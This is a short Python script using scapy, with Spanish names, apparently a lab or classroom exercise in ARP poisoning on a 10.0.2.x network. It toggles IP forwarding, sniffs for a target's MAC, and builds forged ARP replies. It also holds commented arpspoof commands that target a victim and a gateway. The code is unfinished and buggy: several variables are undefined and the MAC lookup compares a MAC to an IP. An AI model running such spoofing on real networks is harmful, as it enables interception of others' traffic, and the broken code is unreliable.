import os
from scapy.all import * 
#os.sys("echo 1 > /proc/sys/net/ipv4/ip_forward")

def cambiar_fw(valor):
	f=open("/proc/sys/net/ipv4/ip_forward","w")
	s=str(valor)
	f.write(s)
	f.close()
	
def menuForwarding():
	print("0)Sin Forwarding")
	print("1)Con Forwarding")
	teclado = input()

	if  (teclado == 0):
		cambiar_fw(0)
		print("Desactivando Forwarding")
	elif (teclado == 1):
		cambiar_fw(1)
		print("Activando Forwarding") 

def getMACfromIP(ip):
	pping=IP(dst=ip)/ICMP()
	sendp(pping)
	pcap=sniff(filter="icmp and host 10.0.2.4",count=1)
	panalisis=pcap[0]
	print(panalisis[Ether].src)
	if (panalisis[Ether].src==ip):
		mac=panalisis[Ether].src
	elif (panalisis[Ether].dst==ip):
		mac=panalisis[Ether].dst
	else:
		return 0

	print(ip)
	print(mac)
	return mac

def arpPoissoning(IP_OBJETIVO,IP_GATEWAY):
	p1=buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_GATEWAY,IP_OBJETIVO)
	p2=buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_OBJETIVO,IP_GATEWAY)
#menuForwarding()

#os.system("echo hola")


#arpspoof -i eth3 -t Objetivo Gateway

#arpspoof -i eth3 -t Gateway Objetivo

#arpspoof -i eth0 -t 10.0.2.4 10.0.2.1
#arpspoof -i eth0 -t 10.0.2.1 10.0.2.4


def buildPacket(MAC_PROPIA,MAC_OBJETIVO,psrc,pdst):
	p=Ether()/ARP()
	p[Ether].dst=MAC_OBJETIVO
	p[Ether].src=MAC_PROPIA
	p[ARP].op="is-at"
	p[ARP].hwsrc=MAC_PROPIA
	p[ARP].psrc=IP_GATEWAY
	p[ARP].hwdst=MAC_OBJETIVO
	p[ARP].pdst=IP_OBJETIVO
	return p


getMACfromIP("10.0.2.4")
#print("0)Dejar de enviar paquetes") 
#sendp(p*1000,inter=1)
#p.show()

